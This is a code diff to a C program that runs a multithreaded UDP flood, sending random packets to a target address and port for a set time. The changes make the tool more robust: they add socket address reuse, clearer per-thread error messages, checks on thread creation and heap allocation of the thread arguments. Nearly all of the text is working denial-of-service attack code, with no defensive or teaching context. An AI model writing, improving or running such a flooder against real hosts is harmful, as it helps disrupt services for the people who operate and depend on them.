@@ -5,6 +5,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <time.h>
+#include <errno.h>
 
 #define PACKET_SIZE 1024
 
@@ -22,6 +23,10 @@ void* udp_flood(void* arg) {
         return NULL;
     }
 
+    // Allow address reuse to avoid "Address already in use" errors
+    int optval = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
     char payload[PACKET_SIZE];
     srand(time(NULL) + args->thread_id); // Unique seed per thread
 
@@ -31,11 +36,14 @@ void* udp_flood(void* arg) {
             payload[i] = rand() % 256;
         }
 
-        if (sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args->server, sizeof(args->server)) < 0) {
-            perror("sendto failed");
+        ssize_t sent_bytes = sendto(sock, payload, PACKET_SIZE, 0,
+                                    (struct sockaddr*)&args->server, sizeof(args->server));
+        if (sent_bytes < 0) {
+            fprintf(stderr, "Thread %d: sendto failed: %s\n", args->thread_id, strerror(errno));
+            break;
         }
 
-        usleep(1000); // Optional throttle to control flood intensity
+        usleep(1000); // Optional throttle to avoid overwhelming network
     }
 
     close(sock);
@@ -61,22 +69,28 @@ int main(int argc, char* argv[]) {
     int duration = atoi(argv[4]);
     time_t end_time = time(NULL) + duration;
 
-    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n", argv[1], atoi(argv[2]), duration, threads);
+    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
+           argv[1], atoi(argv[2]), duration, threads);
 
     pthread_t thread_pool[threads];
-    ThreadArgs args[threads];
+    ThreadArgs* args = malloc(threads * sizeof(ThreadArgs)); // Allocate separate memory for each thread
 
     for (int i = 0; i < threads; i++) {
         args[i].server = server;
         args[i].end_time = end_time;
         args[i].thread_id = i;
-        pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]);
+        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]) != 0) {
+            perror("Failed to create thread");
+            free(args);
+            return 1;
+        }
     }
 
     for (int i = 0; i < threads; i++) {
         pthread_join(thread_pool[i], NULL);
     }
 
+    free(args); // Free allocated memory
     printf("UDP flood completed.\n");
     return 0;
 }
